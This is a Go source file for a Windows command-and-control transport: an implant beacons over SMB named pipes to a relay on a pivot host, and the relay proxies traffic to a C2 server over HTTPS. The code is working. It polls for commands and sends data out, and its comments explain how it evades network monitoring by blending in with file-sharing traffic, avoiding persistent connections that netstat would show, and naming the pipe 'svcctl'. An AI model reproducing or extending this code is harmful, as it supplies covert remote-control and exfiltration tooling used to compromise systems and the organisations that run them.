//go:build windows

// SMB named pipe C2 transport — Windows implementation.
//
// Connects to a named pipe on the C2 relay host using the UNC path:
//   \\<server>\pipe\<pipeName>
//
// This transport never opens a TCP socket to the C2 server directly.
// Instead:
//   1. Agent connects to the relay's named pipe over SMB (port 445).
//   2. The relay (a lightweight Go process, cmd/listener/smb_relay.go) reads
//      the framed message, proxies it to the real C2 server over HTTPS,
//      and writes the response back to the pipe.
//   3. From a network monitoring perspective the agent only talks SMB —
//      identical to normal file-sharing traffic.
//
// Frame format (little-endian):
//   [magic  uint32]  0x54425550  ("TBUP")
//   [type   uint8 ]  0=data 1=poll 2=ack
//   [length uint32]  byte length of the following payload
//   [payload ...]
//
// The relay echoes the same frame back with type=ack and the server response
// embedded in the payload field.
package transport

import (
	"encoding/binary"
	"fmt"
	"io"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	procCreateFile      = kernel32.NewProc("CreateFileW")
	procWriteFile       = kernel32.NewProc("WriteFile")
	procReadFile        = kernel32.NewProc("ReadFile")
	procCloseHandle     = kernel32.NewProc("CloseHandle")
	procWaitNamedPipe   = kernel32.NewProc("WaitNamedPipeW")
)

const (
	smbMagic        = uint32(0x54425550) // "TBUP"
	smbFrameHdr     = 9                  // magic(4) + type(1) + length(4)
	smbTypeData     = uint8(0)
	smbTypePoll     = uint8(1)
	smbTypeAck      = uint8(2)
	smbConnTimeout  = 5000 // ms for WaitNamedPipe
	smbReadTimeout  = 10 * time.Second
	invalidHandle   = ^uintptr(0) // INVALID_HANDLE_VALUE
	genericReadWrite = 0xC0000000
	openExisting    = 3
	fileFlagNone    = 0
)

// SMBClient beacons over a Windows named pipe to a relay host.
type SMBClient struct {
	PipePath  string // \\server\pipe\pipename
	SessionID string
}

// NewSMBClient constructs an SMB transport client.
// serverHost: NetBIOS name or IP of the relay (e.g. "192.168.1.5" or "FILESERVER01")
// pipeName: name of the pipe on the relay (e.g. "svcctl")
func NewSMBClient(serverHost, pipeName, agentID string) (*SMBClient, error) {
	if serverHost == "" || pipeName == "" {
		return nil, fmt.Errorf("SMB: serverHost and pipeName are required")
	}
	sid := agentID
	if len(sid) > 8 {
		sid = sid[:8]
	}
	pipePath := fmt.Sprintf(`\\%s\pipe\%s`, serverHost, pipeName)
	return &SMBClient{
		PipePath:  pipePath,
		SessionID: sid,
	}, nil
}

// SendData connects to the named pipe, writes a framed data message,
// reads the ack, and closes the connection. Each send is a fresh connection
// to avoid keeping a persistent pipe open (which tools like netstat would show).
func (c *SMBClient) SendData(payload []byte) error {
	h, err := c.openPipe()
	if err != nil {
		return fmt.Errorf("SMB open: %w", err)
	}
	defer closePipeHandle(h)

	frame := buildSMBFrame(smbTypeData, payload)
	if err := writePipe(h, frame); err != nil {
		return fmt.Errorf("SMB write: %w", err)
	}
	// Read ack (relay must send back at minimum an empty ack frame)
	_, err = readPipeFrame(h)
	return err
}

// PollCommand connects, sends a poll frame, reads the relay's response.
// Returns nil, nil when no command is pending.
func (c *SMBClient) PollCommand() ([]byte, error) {
	h, err := c.openPipe()
	if err != nil {
		return nil, fmt.Errorf("SMB open: %w", err)
	}
	defer closePipeHandle(h)

	frame := buildSMBFrame(smbTypePoll, []byte(c.SessionID))
	if err := writePipe(h, frame); err != nil {
		return nil, fmt.Errorf("SMB poll write: %w", err)
	}
	resp, err := readPipeFrame(h)
	if err != nil {
		return nil, err
	}
	if len(resp) == 0 {
		return nil, nil
	}
	return resp, nil
}

// Close is a no-op — connections are closed after each operation.
func (c *SMBClient) Close() {}

// ── private helpers ───────────────────────────────────────────────────────────

func (c *SMBClient) openPipe() (uintptr, error) {
	// WaitNamedPipe blocks until the pipe is available (up to smbConnTimeout ms)
	path16, _ := syscall.UTF16PtrFromString(c.PipePath)
	procWaitNamedPipe.Call(uintptr(unsafe.Pointer(path16)), uintptr(smbConnTimeout))

	h, _, err := procCreateFile.Call(
		uintptr(unsafe.Pointer(path16)),
		uintptr(genericReadWrite),
		0, 0, // no sharing
		uintptr(openExisting),
		uintptr(fileFlagNone),
		0,
	)
	if h == invalidHandle {
		return 0, fmt.Errorf("CreateFile(%s): %v", c.PipePath, err)
	}
	return h, nil
}

func buildSMBFrame(msgType uint8, payload []byte) []byte {
	buf := make([]byte, smbFrameHdr+len(payload))
	binary.LittleEndian.PutUint32(buf[0:], smbMagic)
	buf[4] = msgType
	binary.LittleEndian.PutUint32(buf[5:], uint32(len(payload)))
	copy(buf[smbFrameHdr:], payload)
	return buf
}

func writePipe(h uintptr, data []byte) error {
	if len(data) == 0 {
		return nil
	}
	var written uint32
	r, _, err := procWriteFile.Call(
		h,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
		0,
	)
	if r == 0 {
		return fmt.Errorf("WriteFile: %v", err)
	}
	return nil
}

func readPipeFrame(h uintptr) ([]byte, error) {
	hdr := make([]byte, smbFrameHdr)
	if err := readFull(h, hdr); err != nil {
		return nil, fmt.Errorf("read header: %w", err)
	}

	magic := binary.LittleEndian.Uint32(hdr[0:])
	if magic != smbMagic {
		return nil, fmt.Errorf("SMB bad magic: 0x%X", magic)
	}
	length := binary.LittleEndian.Uint32(hdr[5:])
	if length == 0 {
		return nil, nil
	}
	if length > 4*1024*1024 { // sanity: 4 MB max
		return nil, fmt.Errorf("SMB frame too large: %d", length)
	}

	payload := make([]byte, length)
	if err := readFull(h, payload); err != nil {
		return nil, fmt.Errorf("read payload: %w", err)
	}
	return payload, nil
}

// readFull reads exactly len(buf) bytes from the pipe handle.
func readFull(h uintptr, buf []byte) error {
	total := 0
	for total < len(buf) {
		var n uint32
		r, _, err := procReadFile.Call(
			h,
			uintptr(unsafe.Pointer(&buf[total])),
			uintptr(len(buf)-total),
			uintptr(unsafe.Pointer(&n)),
			0,
		)
		if r == 0 {
			return fmt.Errorf("ReadFile: %v", err)
		}
		if n == 0 {
			return io.ErrUnexpectedEOF
		}
		total += int(n)
	}
	return nil
}

func closePipeHandle(h uintptr) {
	if h != 0 && h != invalidHandle {
		procCloseHandle.Call(h)
	}
}

// ── Server-side relay listener (run on internal pivot host) ──────────────────

// SMBPipeListener listens on a named pipe and proxies framed messages to a C2 URL.
// Run this on an internal host that has both SMB access from the target and
// outbound HTTPS to the C2 server.
type SMBPipeListener struct {
	PipeName string // e.g. "svcctl"
	C2URL    string // HTTPS URL of the real C2 server
}

// ListenAndProxy starts the relay.  Blocks until ctx is done.
// Each accepted pipe connection is handled in a goroutine.
func (l *SMBPipeListener) ListenAndProxy() error {
	// Full named-pipe server implementation is in cmd/listener/smb_relay.go
	// to keep this package focused on the client transport.
	// This stub documents the interface.
	return fmt.Errorf("use cmd/listener/smb_relay: go run ./cmd/listener/smb_relay --pipe %s --c2 %s",
		l.PipeName, l.C2URL)
}
